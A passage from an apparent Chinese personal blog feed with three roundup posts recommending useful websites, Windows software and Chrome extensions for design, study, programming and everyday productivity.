fa-external-link"></i></span></p><p>MDmixer:<span class="exturl" data-url="aHR0cDovL21hdGVyaWFsbWl4ZXIuY28v" title="http://materialmixer.co/">http://materialmixer.co/<i class="fa fa-external-link"></i></span></p><hr><p><strong>UI界面篇：</strong></p><p>花瓣网：<span class="exturl" data-url="aHR0cDovL2h1YWJhbi5jb20v" title="http://huaban.com/">http://huaban.com/<i class="fa fa-external-link"></i></span></p><p>堆糖网：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZHVpdGFuZy5jb20v" title="https://www.duitang.com/">https://www.duitang.com/<i class="fa fa-external-link"></i></span></p><p>pinterest:<span class="exturl" data-url="aHR0cHM6Ly93d3cucGludGVyZXN0LmNvbS8=" title="https://www.pinterest.com/">https://www.pinterest.com/<i class="fa fa-external-link"></i></span></p><p>酷站：<span class="exturl" data-url="aHR0cHM6Ly93d3cuemNvb2wuY29tLmNuLw==" title="https://www.zcool.com.cn/">https://www.zcool.com.cn/<i class="fa fa-external-link"></i></span></p><p>uplabs:<span class="exturl" data-url="aHR0cHM6Ly9tYXRlcmlhbC51cGxhYnMuY29tLw==" title="https://material.uplabs.com/">https://material.uplabs.com/<i class="fa fa-external-link"></i></span></p><p>dribbble:<span class="exturl" data-url="aHR0cHM6Ly9kcmliYmJsZS5jb20v" title="https://dribbble.com/">https://dribbble.com/<i class="fa fa-external-link"></i></span></p><p>flagui:<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVoYWJjZW50ZXIubWFya2V0aW5nL3RpbnR1aS9mbGF0Lmh0bWw=" title="https://www.rehabcenter.marketing/tintui/flat.html">https://www.rehabcenter.marketing/tintui/flat.html<i class="fa fa-external-link"></i></span></p><p>UI中国：<span class="exturl" data-url="aHR0cDovL3d3dy51aS5jbi8=" title="http://www.ui.cn/">http://www.ui.cn/<i class="fa fa-external-link"></i></span></p><hr><p><strong>图标篇：</strong></p><p>md icon:   <span class="exturl" data-url="aHR0cHM6Ly93d3cubWF0ZXJpYWxwYWxldHRlLmNvbS9pY29ucw==" title="https://www.materialpalette.com/icons">https://www.materialpalette.com/icons<i class="fa fa-external-link"></i></span></p><p>​               <span class="exturl" data-url="aHR0cHM6Ly93d3cubWF0ZXJpYWx1aS5jby9pY29ucw==" title="https://www.materialui.co/icons">https://www.materialui.co/icons<i class="fa fa-external-link"></i></span></p><p>iconfont:<span class="exturl" data-url="aHR0cDovL2ljb25mb250LmNuLw==" title="http://iconfont.cn/">http://iconfont.cn/<i class="fa fa-external-link"></i></span></p><p>findicons:<span class="exturl" data-url="aHR0cDovL2ZpbmRpY29ucy5jb20v" title="http://findicons.com/">http://findicons.com/<i class="fa fa-external-link"></i></span></p><hr><p><strong>学设计：</strong></p><p>设计师导航网站:<span class="exturl" data-url="aHR0cHM6Ly9oYW8udWlzZGMuY29tLw==" title="https://hao.uisdc.com/">https://hao.uisdc.com/<i class="fa fa-external-link"></i></span></p><hr><p><strong>绘图篇：</strong></p><p>使用简单的格式化语言绘图工具：<span class="exturl" data-url="aHR0cDovL3d3dy5ncmFwaHZpei5vcmcv" title="http://www.graphviz.org/">http://www.graphviz.org/<i class="fa fa-external-link"></i></span></p><p>processon：<span class="exturl" data-url="aHR0cHM6Ly93d3cucHJvY2Vzc29uLmNvbS8=" title="https://www.processon.com/">https://www.processon.com/<i class="fa fa-external-link"></i></span></p><hr><p><strong>壁纸篇：</strong></p><p>pinsdaddy：<span class="exturl" data-url="aHR0cDovL3d3dy5waW5zZGFkZHkuY29tLw==" title="http://www.pinsdaddy.com/">http://www.pinsdaddy.com/<i class="fa fa-external-link"></i></span></p><p>wallpaperup：<span class="exturl" data-url="aHR0cHM6Ly93d3cud2FsbHBhcGVydXAuY29tLw==" title="https://www.wallpaperup.com/">https://www.wallpaperup.com/<i class="fa fa-external-link"></i></span></p><p>vlad工作室：<span class="exturl" data-url="aHR0cHM6Ly92bGFkLnN0dWRpby96aC93YWxscGFwZXJzLw==" title="https://vlad.studio/zh/wallpapers/">https://vlad.studio/zh/wallpapers/<i class="fa fa-external-link"></i></span></p><p>简单壁纸：<span class="exturl" data-url="aHR0cDovL3NpbXBsZWRlc2t0b3BzLmNvbS8=" title="http://simpledesktops.com/">http://simpledesktops.com/<i class="fa fa-external-link"></i></span></p><hr><p><strong>程序员工具篇：</strong></p><p>CSDN博客网：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY3Nkbi5uZXQv" title="https://www.csdn.net/">https://www.csdn.net/<i class="fa fa-external-link"></i></span></p><p>简书博客网：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20v" title="https://www.jianshu.com/">https://www.jianshu.com/<i class="fa fa-external-link"></i></span></p><p>可视化算法学习：<span class="exturl" data-url="aHR0cHM6Ly92aXN1YWxnby5uZXQv" title="https://visualgo.net/">https://visualgo.net/<i class="fa fa-external-link"></i></span></p><p>Github：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLw==" title="https://github.com/">https://github.com/<i class="fa fa-external-link"></i></span></p><p>正则表达式测试与常用表达式搜索（很推荐）：<span class="exturl" data-url="aHR0cHM6Ly9yZWdleDEwMS5jb20v" title="https://regex101.com/">https://regex101.com/<i class="fa fa-external-link"></i></span></p><p>postman（服务器接口调试工具）：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZ2V0cG9zdG1hbi5jb20v" title="https://www.getpostman.com/">https://www.getpostman.com/<i class="fa fa-external-link"></i></span></p><p>各种工具资源下载地sourceforge：<span class="exturl" data-url="aHR0cHM6Ly9zb3VyY2Vmb3JnZS5uZXQv" title="https://sourceforge.net/">https://sourceforge.net/<i class="fa fa-external-link"></i></span></p><p>在线运行各类编程语言：<span class="exturl" data-url="aHR0cHM6Ly9jLnJ1bm9vYi5jb20v" title="https://c.runoob.com/">https://c.runoob.com/<i class="fa fa-external-link"></i></span></p><p>json2javabean:<span class="exturl" data-url="aHR0cDovL3d3dy5hdG9vbC5vcmcvanNvbjJqYXZhYmVhbi5waHA=" title="http://www.atool.org/json2javabean.php">http://www.atool.org/json2javabean.php<i class="fa fa-external-link"></i></span></p><p>变量取名：<span class="exturl" data-url="aHR0cHM6Ly91bmJ1Zy5naXRodWIuaW8vY29kZWxmLw==" title="https://unbug.github.io/codelf/">https://unbug.github.io/codelf/<i class="fa fa-external-link"></i></span></p><hr><p><strong>数学工具：</strong></p><p>在线matlab：<span class="exturl" data-url="aHR0cHM6Ly9vY3RhdmUtb25saW5lLm5ldC8=" title="https://octave-online.net/">https://octave-online.net/<i class="fa fa-external-link"></i></span></p><p>强大的数学绘图网：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGVzbW9zLmNvbS8=" title="https://www.desmos.com/">https://www.desmos.com/<i class="fa fa-external-link"></i></span></p><hr><p><strong>Latex</strong></p><p>late2png：<span class="exturl" data-url="aHR0cDovL2xhdGV4MnBuZy5jb20v" title="http://latex2png.com/">http://latex2png.com/<i class="fa fa-external-link"></i></span></p><p>Latex开源小屋：<span class="exturl" data-url="aHR0cDovL3d3dy5jaGluYXRleC5vcmcv" title="http://www.chinatex.org/">http://www.chinatex.org/<i class="fa fa-external-link"></i></span></p><p>Latex维基百科教学：<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpYm9va3Mub3JnL3dpa2kvTGFUZVg=" title="https://zh.wikibooks.org/wiki/LaTeX">https://zh.wikibooks.org/wiki/LaTeX<i class="fa fa-external-link"></i></span></p><p>Latex列表书写：<span class="exturl" data-url="aHR0cDovL3d3dy50YWJsZXNnZW5lcmF0b3IuY29tLw==" title="http://www.tablesgenerator.com/">http://www.tablesgenerator.com/<i class="fa fa-external-link"></i></span></p><p>​            <span class="exturl" data-url="aHR0cHM6Ly90cnViZW4ubm8vdGFibGUv" title="https://truben.no/table/">https://truben.no/table/<i class="fa fa-external-link"></i></span></p><p>Latex在线编辑器： <span class="exturl" data-url="aHR0cHM6Ly9jbi5zaGFyZWxhdGV4LmNvbS8=" title="https://cn.sharelatex.com/">https://cn.sharelatex.com/<i class="fa fa-external-link"></i></span></p><p>​                <span class="exturl" data-url="aHR0cHM6Ly93d3cub3ZlcmxlYWYuY29tLw==" title="https://www.overleaf.com/">https://www.overleaf.com/<i class="fa fa-external-link"></i></span></p><p>Latex问题社区（类似于Stackflow）：<span class="exturl" data-url="aHR0cHM6Ly90ZXguc3RhY2tleGNoYW5nZS5jb20v" title="https://tex.stackexchange.com/">https://tex.stackexchange.com/<i class="fa fa-external-link"></i></span></p><p>TexStudio安装：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZG9jbmFuL3AvNzEwMzU5OS5odG1sP3V0bV9zb3VyY2U9aXRkYWRhbyZhbXA7dXRtX21lZGl1bT1yZWZlcnJhbA==" title="https://www.cnblogs.com/docnan/p/7103599.html?utm_source=itdadao&amp;utm_medium=referral">https://www.cnblogs.com/docnan/p/7103599.html?utm_source=itdadao&amp;utm_medium=referral<i class="fa fa-external-link"></i></span></p><hr><p><strong>pdf处理工具：</strong></p><p>addpdf（免费pdf转word）：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYWRkcGRmLmNuLw==" title="https://www.addpdf.cn/">https://www.addpdf.cn/<i class="fa fa-external-link"></i></span></p><p>lightpdf：<span class="exturl" data-url="aHR0cHM6Ly9saWdodHBkZi5jb20vemgv" title="https://lightpdf.com/zh/">https://lightpdf.com/zh/<i class="fa fa-external-link"></i></span></p><p>hipdf：<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGlwZGYuY24v" title="https://www.hipdf.cn/">https://www.hipdf.cn/<i class="fa fa-external-link"></i></span></p><hr><p><strong>下载工具：</strong></p><ul><li>Aria2下载工具，配合的web控制面板：<span class="exturl" data-url="aHR0cDovL2V1Y2guZ290b2lwMS5jb20vYXJpYS1uZy8jIS9zdGF0dXM=" title="http://euch.gotoip1.com/aria-ng/#!/status">http://euch.gotoip1.com/aria-ng/#!/status<i class="fa fa-external-link"></i></span></li><li>IDM</li><li>FDM</li></ul><hr><p><strong>在线翻译：</strong></p><p>谷歌翻译：<span class="exturl" data-url="aHR0cHM6Ly90cmFuc2xhdGUuZ29vZ2xlLmNuLw==" title="https://translate.google.cn/">https://translate.google.cn/<i class="fa fa-external-link"></i></span></p><p>百度翻译：<span class="exturl" data-url="aHR0cHM6Ly9mYW55aS5iYWlkdS5jb20v" title="https://fanyi.baidu.com/">https://fanyi.baidu.com/<i class="fa fa-external-link"></i></span></p><p>有道翻译：<span class="exturl" data-url="aHR0cDovL2ZhbnlpLnlvdWRhby5jb20v" title="http://fanyi.youdao.com/">http://fanyi.youdao.com/<i class="fa fa-external-link"></i></span></p><hr><p><strong>格式转换：</strong></p><p>图片格式转换：<span class="exturl" data-url="aHR0cHM6Ly9qaW5hY29udmVydC5jb20vY24v" title="https://jinaconvert.com/cn/">https://jinaconvert.com/cn/<i class="fa fa-external-link"></i></span></p><p>在线各类格式转换：<span class="exturl" data-url="aHR0cHM6Ly9jbG91ZGNvbnZlcnQuY29tL2Zvcm1hdHM=" title="https://cloudconvert.com/formats">https://cloudconvert.com/formats<i class="fa fa-external-link"></i></span></p><hr><p><strong>刷机党：</strong></p><p>谷歌套件：<span class="exturl" data-url="aHR0cDovL29wZW5nYXBwcy5vcmcv" title="http://opengapps.org/">http://opengapps.org/<i class="fa fa-external-link"></i></span></p><p>rec工具：<span class="exturl" data-url="aHR0cHM6Ly90d3JwLm1lLw==" title="https://twrp.me/">https://twrp.me/<i class="fa fa-external-link"></i></span></p><p>xda社区：<span class="exturl" data-url="aHR0cHM6Ly93d3cueGRhLWRldmVsb3BlcnMuY29tLw==" title="https://www.xda-developers.com/">https://www.xda-developers.com/<i class="fa fa-external-link"></i></span></p><hr><p><strong>其他：</strong></p><p>在线云端空间（功能蛮强大的，在线matlab，ps，word等等都有，就是网络要求较高）：<span class="exturl" data-url="aHR0cHM6Ly91emVyLm1lL3ovYXBwcw==" title="https://uzer.me/z/apps">https://uzer.me/z/apps<i class="fa fa-external-link"></i></span></p><p>正版中国（找得到一些限时免费的软件）：<span class="exturl" data-url="aHR0cHM6Ly9nZXRpdGZyZWUuY24v" title="https://getitfree.cn/">https://getitfree.cn/<i class="fa fa-external-link"></i></span></p><p>视频搜索：<span class="exturl" data-url="aHR0cDovL3d3dy5mdWxpZ2V0Lm5ldC8=" title="http://www.fuliget.net/">http://www.fuliget.net/<i class="fa fa-external-link"></i></span></p><p>在线取色器：<span class="exturl" data-url="aHR0cDovL3d3dy5qaW5pYW5uZXQuY29tL3BhZ2UvYWxsY29sb3I=" title="http://www.jiniannet.com/page/allcolor">http://www.jiniannet.com/page/allcolor<i class="fa fa-external-link"></i></span></p><p>writefullapp（书写反馈，也是蛮有趣的东西）<span class="exturl" data-url="aHR0cHM6Ly93cml0ZWZ1bGxhcHAuY29tLw==" title="https://writefullapp.com/">https://writefullapp.com/<i class="fa fa-external-link"></i></span></p><p>MSDN（原生windows镜像、软件下载）：<span class="exturl" data-url="aHR0cDovL3d3dy5pbXNkbi5jbi8=" title="http://www.imsdn.cn/">http://www.imsdn.cn/<i class="fa fa-external-link"></i></span></p><p>vip视频解析：<span class="exturl" data-url="aHR0cDovL3d3dy5xbWFpbGUuY29tLw==" title="http://www.qmaile.com/">http://www.qmaile.com/<i class="fa fa-external-link"></i></span></p><hr><p>嘛，差不多就这样了，还有一些细致的东西就不写了。也欢迎各位小伙伴评论补充干货网站咯。</p>]]></content>
      
      
      <categories>
          
          <category> 知识理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这些年，我所用过的精品软件（PC干货篇)</title>
      <link href="/archives/a014e5e9.html"/>
      <url>/archives/a014e5e9.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>个人比较喜欢收集些好用的软件，这里就整理收集一下这些年的PC干货吧。</p></blockquote><p>这里做了一个小系列:<br><a href="https://www.ravenxrz.ink/archives/5cb17766.html">这些年，我所用过精品Chrome插件（插件干货篇）</a><br><a href="https://www.ravenxrz.ink/archives/a014e5e9.html">这些年，我所用过精品软件（PC干货篇）</a><br><a href="https://www.ravenxrz.ink/archives/b1ec495.html">这些年，我所用精品网站（网站干货篇）</a></p><p>那么就从我的桌面开截图开始慢慢扫荡好了：</p><a id="more"></a><p><img data-src="https://pic.superbed.cn/item/5cfbb471451253d178d9b001.png" alt="1553252357116.png"></p><p><strong>1.超强的动态壁纸：wallpaper engine</strong>。（steam上购买，我记得我入手的时候是18元，相信我这软件绝对值这个价格）</p><p>like this：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb50e451253d178d9ba01.gif" alt="img"></p><p>and this:</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb517451253d178d9ba96.gif" alt="img"></p><p>上图摘自：<span class="exturl" data-url="aHR0cDovL2Jicy5uZ2EuY24vcmVhZC5waHA/dGlkPTEwNjA2NDkxJmFtcDtyYW5kPTc2OQ==" title="http://bbs.nga.cn/read.php?tid=10606491&amp;rand=769">http://bbs.nga.cn/read.php?tid=10606491&amp;rand=769<i class="fa fa-external-link"></i></span></p><p>在官网上有很多很多的这类动态壁纸，反正强烈推荐啦。（ps：其实是有破解版的，但是还是去支持下正版吧，反正也不贵）</p><p><strong>2.可能是最好的远程控制软件：TeamViewer</strong>。反正QQ的远程控制我是无力吐槽了，我原来的实验室就是用这个做在线技术交流分享和项目演示的。另外使用<strong>TeamViewer+BIOS自动开关机</strong>，就可以把性能较强的台式放在家里（寝室），然后用笔记本连接接台式机，实现在外办公啦。</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb522451253d178d9bbb8.png" alt="1553252545166.png"></p><p><strong>文件搜索神器：</strong>Everything，这个软件应该是大多数朋友都会标配的吧，找文件快的不要不要的，基本都是秒反应了。也是支持通配符的，如下面找到本机所有的java文件：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb524451253d178d9bc0e.png" alt="1553252697148.png"></p><p><strong>Snipaste，不只是QQ截图的替代品</strong>，这款软件除了具有基本的截图功能外，还有一些其他高级功能。其中我最喜欢的就是截图浮窗了，什么意思呢？比如我现在在读文章，需要反复查看一段话，那么我们可以把这段话浮窗在屏幕上，然后继续看后面的文字。<strong>talk is cheap ,show me the function:</strong></p><p><img data-src="https://pic1.superbed.cn/item/5cfbb525451253d178d9bc60.png" alt="1553253065862.png"></p><p>比如，我要反复查看上面这个神经网络框架图来对比参数设计表，那么我可以执行截图然后把它悬浮在屏幕上，然后继续读下面的内容（就<strong>和Excel的冻结窗口是一个道理</strong>）：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb528451253d178d9bca2.png" alt="1553253144205.png"></p><p>看，我已经把这个框架图扣出来放在一边了，然后我就可以继续往下读了。</p><p><strong>DiskGenius：</strong>装过系统的朋友应该对它都不陌生吧。不过一般来说都用不到的。我也不懂它的所有功能，只有装系统的时候用来分分区罢了。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb52a451253d178d9bd00.png" alt="1553253259723.png"></p><p><strong>小飞机酸酸乳：</strong>这东西，不好具体介绍。反正就是用来实现科学上网的啦。</p><p><img data-src="https://pic3.superbed.cn/item/5cfbb52c451253d178d9bd6e.png" alt="1553253318049.png"></p><p><strong>Fish.exe：</strong>百度文库，阿里文库资源免费下载，下载出来的格式为pdf。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb52d451253d178d9bdc5.png" alt="1553253355460.png"></p><p><strong>FeiQ.exe（又名飞秋)：</strong>局域网传文件超爽的啦。公司、实验室一般都会用到。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb52e451253d178d9be06.png" alt="1553253408651.png"></p><p><strong>XMind ZEN：</strong>XMind在思维导图上几乎已经做到了王者的地位了吧。ZEN版本比较轻量级，UI也做得很好看。还是比较推荐的。另外也是支持Linux平台，同时可以直接同步到<strong>印象笔记</strong>的。</p><p><img data-src="https://raw.githubusercontent.com/ravenxrz/BlogPic/master/img/3213538-91f7f360fa89d879.png" alt="1553253489467.png"></p><p><strong>坚果云：</strong>全平台文件同步软件。像什么团队合作写文档啊，放资料这个还是比QQ群好用到哪里去了。不过本人主要是用来<strong>同步Zeotero的文献库的。（后文会提到这个，不过要详解怎么做，估计又得写一篇博文了，之后来看吧）</strong></p><p><img data-src="https://pic.superbed.cn/item/5cfbb530451253d178d9be3b.png" alt="1553253599891.png"></p><p>**Zetero:**个人觉得最好用的论文文献管理软件了（甚至超过老牌的EndNote），支持全平台，开源的优点直接促使了它支持超多好用的插件。再配合chrome的插件，再也不怕论文乱啦。</p><p>软件主界面：</p><p><img data-src="https://pic1.superbed.cn/item/5cfbb531451253d178d9be71.png" alt="1553255332663.png"></p><p>配置chrome插件，导入论文：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb534451253d178d9bec4.png" alt="1553255487125.png"></p><p>当然了，要说这个软件，也得再写一篇博文了，这里就个它的入门教程吧：<span class="exturl" data-url="aHR0cHM6Ly93d3cueWFuZ3poaXBpbmcuY29tL3RlY2gvem90ZXJvMS5odG1s" title="https://www.yangzhiping.com/tech/zotero1.html">https://www.yangzhiping.com/tech/zotero1.html<i class="fa fa-external-link"></i></span></p><p><strong>SpaceSniff：</strong>超强的磁盘文件占用空间分析器。软件很小，但是却意外的超好用。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb537451253d178d9bf2b.png" alt="1553253720476.png"></p><p>如图，哪些文件大，哪些文件小。可以马上看出来。用来<strong>整理释放空间</strong>就相当好用了。</p><p>**Pandownload:**突破百度云限速，猜得没错的话，底层应该就是用Aria2实现的。关于aria2，可以看我的另一篇博文:<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8xNzZlMDk0MzhjNWYsJUU0JUI4JThEJUU4JUJGJTg3JUU2JTg4JTkxJUU2JTk4JUFGJUU4JUFGJUI0JUU3JTlBJTg0JUU2JTg5JThCJUU2JTlDJUJBJUU2JTkwJUFEJUU1JUJCJUJBJUUzJTgwJTgyUEMlRTYlOTAlQUQlRTUlQkIlQkElRTQlQjklOUYlRTUlQkUlODglRTclQUUlODAlRTUlOEQlOTUlRTMlODAlODI=" title="https://www.jianshu.com/p/176e09438c5f,%E4%B8%8D%E8%BF%87%E6%88%91%E6%98%AF%E8%AF%B4%E7%9A%84%E6%89%8B%E6%9C%BA%E6%90%AD%E5%BB%BA%E3%80%82PC%E6%90%AD%E5%BB%BA%E4%B9%9F%E5%BE%88%E7%AE%80%E5%8D%95%E3%80%82">https://www.jianshu.com/p/176e09438c5f,不过我是说的手机搭建。PC搭建也很简单。<i class="fa fa-external-link"></i></span></p><p><img data-src="https://pic1.superbed.cn/item/5cfbb53a451253d178d9bf90.png" alt="1553253970916.png"></p><p><strong>Ditto：</strong>windows复制剪贴板加强。其实就是保存你的复制板的历史，可以粘贴以前复制过得东西（包括图片，文件等等），同时支持剪贴板局域网共享等功能（这个我就没用过了）。总体来说，功能虽不多，但是却意外的实用。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb53b451253d178d9bfc2.png" alt="1553254129523.png"></p><p>**Xshell:**有服务器的朋友，这个应该不会陌生吧。没有服务器的朋友，一般就用不到了。</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb541451253d178d9c037.png" alt="1553254177139.png"></p><p><strong>typora:  所见即所得的MD编辑器</strong>，支持所有平台。我写的博文基本都是先用这个写好，在上传的。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb543451253d178d9c073.png" alt="1553254264668.png"></p><p><strong>zeal：</strong>码农才会用到的编程API查询软件，不过实际体验不算很好，远比不上<strong>mac下的Dash</strong>，但是<strong>Dash</strong>没windows版本啊。<strong>这里推荐另外一个在线的api</strong>：<span class="exturl" data-url="aHR0cHM6Ly9kZXZkb2NzLmlvLyVFMyU4MCU4MiVFNCVCRCVCRiVFNyU5NCVBOGNocm9tZSVFNyU5QSU4NGFwcCVFNiVBOCVBMSVFNSVCQyU4RiVFRiVCQyU4QyVFNSVCMCVCMSVFNyU5QiVCOCVFNSVCRCU5MyVFNCVCQSU4RSVFNCVCOCU4MCVFNCVCOCVBQSVFOCVCRCVBRiVFNCVCQiVCNiVFNCVCQSU4NiVFRiVCQyU5QQ==" title="https://devdocs.io/%E3%80%82%E4%BD%BF%E7%94%A8chrome%E7%9A%84app%E6%A8%A1%E5%BC%8F%EF%BC%8C%E5%B0%B1%E7%9B%B8%E5%BD%93%E4%BA%8E%E4%B8%80%E4%B8%AA%E8%BD%AF%E4%BB%B6%E4%BA%86%EF%BC%9A">https://devdocs.io/。使用chrome的app模式，就相当于一个软件了：<i class="fa fa-external-link"></i></span></p><p><img data-src="https://pic.superbed.cn/item/5cfbb544451253d178d9c0a6.png" alt="1553254438281.png"></p><p><strong>Genymotion：</strong>做android开发的朋友应该知道这个。其实就是一个Android模拟器，比原生模拟器好用太多了。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb547451253d178d9c0fa.png" alt="1553254561677.png"></p><p><strong>印象笔记：</strong>笔记应用，最近windows终于支持了markdown，但是它的md有点丑啊。<strong>我主要是用它的chrome的插件来保存那些我觉得有用的网站快照</strong>。当然不同人的用法不一样咯，总体来说还是非常不错的。它提供了很多笔记模板，方便用户快速上手：</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb548451253d178d9c131.png" alt="1553254715987.png"></p><hr><p>OK,我桌面上的软件基本上就介绍完了，接下来再介绍一些我桌面所没有的那些软件吧：</p><p><strong>好用无广告的压缩软件：Bandzip</strong></p><p><img data-src="https://pic.superbed.cn/item/5cfbb54a451253d178d9c168.png" alt="1553254809320.png"></p><p><strong>轻量级图片查看器：HoneyView</strong></p><p><strong>本地视频播放器：potplayer</strong>支持的解码格式多，解码速度也很快。</p><p><em>windows效率神器：</em>这东西怎么说呢，很多人说它好，我也专门下载来看了看，的确有一些使用功能。比如快速打开某个软件，自定义某些动作宏，等等。但是给我的体验并不大好，如会出现卡顿，窗体触发有点快（虽然这个可以改，但是我还是不大喜欢）。这里展示它的一个功能：</p><p><img data-src="https://pic3.superbed.cn/item/5cfbb54b451253d178d9c19e.gif" alt="img"></p><p><strong>配合Everything来搜索文件。</strong></p><p><strong>cmder:</strong> 喜欢linux命令？windows的cmd窗口太难看？这个软件可以满足你。</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb54e451253d178d9c1e9.png" alt="1553255629839.png"></p><p>我这个是默认的窗口，它是支持更改背景图等等的。<strong>同时配合cygwin来实现linux下的各种常用命令，像git,grep,find</strong>等常用命令都是支持的。下图是我使用find命令来查找所有的java文件：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb54f451253d178d9c21c.png" alt="1553255820340.png"></p><p><strong>好用的pdf阅读器：Foxit Reader</strong> 最喜欢的就是它的注释功能啦。还自带了翻译功能，阅读文献很是方便。</p>]]></content>
      
      
      <categories>
          
          <category> 知识理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PC软件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这些年，我所用过的精品Chrome插件（插件干货篇）</title>
      <link href="/archives/5cb17766.html"/>
      <url>/archives/5cb17766.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>个人比较喜欢收集些好用的软件，这里就整理收集一下这些年的chrome插件吧。</p></blockquote><p>这里做了一个小系列:<br><a href="https://www.ravenxrz.ink/archives/5cb17766.html">这些年，我所用过精品Chrome插件（插件干货篇）</a><br><a href="https://www.ravenxrz.ink/archives/a014e5e9.html">这些年，我所用过精品软件（PC干货篇）</a><br><a href="https://www.ravenxrz.ink/archives/b1ec495.html">这些年，我所用精品网站（网站干货篇）</a><br>还是从我的插件集合截图开始好了：</p><a id="more"></a><p><img data-src="https://pic2.superbed.cn/item/5cfbb550451253d178d9c265.png" alt="1553257153816.png"></p><p><strong>广告拦截器：Adblock Plus</strong>。这个倒是没什么好说的，就是个广告拦截器。不过现在有些网站为了盈利，强制让你关闭这个才能浏览它的网站内容。但是这个插件可以针对单个网站进行单独配置，所以也不用担心的。</p><p><img data-src="https://pic1.superbed.cn/item/5cfbb552451253d178d9c2a0.png" alt="1553257255756.png"></p><p><strong>Chrome Cleaner Pro：</strong>chrome的清理插件，但是呢，还是算不错吧。界面如下：</p><p><img data-src="https://pic1.superbed.cn/item/5cfbb553451253d178d9c2d0.png" alt="1553257335016.png"></p><p><strong>Diigo Web Collector：</strong>这个插件就强烈推荐的了。它是干什么的呢？想象你是不是经常看别人的技术博客想要做笔记？嗯，这个插件就是实现这个功能，此外，它还可以批注pdf，网页截图等。你做的所有笔记都会自动同步。要说唯一不好的地方，就是它不支持中文吧。。。。</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb55b451253d178d9c358.png" alt="image.png"></p><p><strong>Github增强</strong>：Github应该是每个程序员都会用到的网站了，所以针对Github有不少好用的插件:</p><ul><li>Enhanced Github: <strong>显示每个文件的大小，单独下载某个文件。</strong></li></ul><p><img data-src="https://pic.superbed.cn/item/5cfbb55c451253d178d9c38f.png" alt="1553257682180.png"></p><ul><li><p>Octo Mate： 下载单个文件（有了上面那个插件，这个也可以不要咯）</p></li><li><p>Octotree： 这个是必备的了。代码树。想象你要在一个仓库里面找一份代码，一层一层的点开链接，简直要命。有了这个插件，就方便多了：</p></li></ul><p><img data-src="https://pic.superbed.cn/item/5cfbb55e451253d178d9c3c0.png" alt="1553257933790.png"></p><p><strong>标签页：</strong></p><ul><li><p>Infinity ，主打使用的标签页吧。支持自定义常用访问网站，如下：<br><img data-src="https://pic2.superbed.cn/item/5cfbb565451253d178d9c44b.png" alt="1553258022051.png"></p></li><li><p>Moment： 主打美观的一个标签页。基本上整个标签页就是一张漂亮的图，下方可以显示你的ToDoList。但是我觉得实用性不高，所以安装后就卸载了。</p></li></ul><p><strong>Imagus：</strong>图片自动放大的一个插件。把鼠标移动到一张网页图片上，就能自动放大。</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb567451253d178d9c47f.png" alt="1553258215612.png"></p><p><strong>Kopernio：</strong> 学术工作者，可以使用这个插件，它又是做什么的呢？它可以自动帮你找寻论文的下载地。并提供预览，下载等功能。并自带了google学术搜索。</p><p><img data-src="https://pic3.superbed.cn/item/5cfbb569451253d178d9c4ba.png" alt="1553258324940.png"></p><p><img data-src="https://pic2.superbed.cn/item/5cfbb570451253d178d9c537.png" alt="1553258347706.png"></p><p>右边这些绿色Button就是帮你找到可以免费下载的地方，点击进去可进行预览，同时也有下载选项。</p><p>这里，我就点击第一个Button，可以跳转到下面这个页面：</p><p><img data-src="https://pic1.superbed.cn/item/5cfbb571451253d178d9c569.png" alt="1553258412419.png"></p><p><strong>Proxy SwitchyOmega：</strong>代理转换插件，为避免科学上网时走全局代理，即在上大陆常用网时也走外网（这样的上网速度很慢），这个插件可以自动在本地IP和外网IP之间切换。而且最近他的配置文件可以同步了，再也不用更换系统，重装chrome就去找配置文件了。nice~</p><p><strong>Tampermonkey：（又名油猴）</strong>应该是这所有插件中最强大的一个插件了吧。主要就是一个脚本平台，可以通过去它的“脚本市场”去下载各种有用的脚本，比如我常用的有“B站破解地域限制（为了<strong>看巨人、喰种啊</strong>）”、“百度网盘密码自动填写”、”拦截广告“、“去除百度搜索搜索出来的广告”等等。反正功能很多，需要慢慢探索。</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb573451253d178d9c5ab.png" alt="1553258724501.png"></p><p><strong>Zotero：</strong> 这个得配合Zetero软件来使用，在我的<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9jOGViNzE3ZThiYzA=" title="https://www.jianshu.com/p/c8eb717e8bc0">PC干货篇<i class="fa fa-external-link"></i></span>有提到这个。可以很方面的导入论文。</p><p><img data-src="https://pic3.superbed.cn/item/5cfbb57a451253d178d9c644.png" 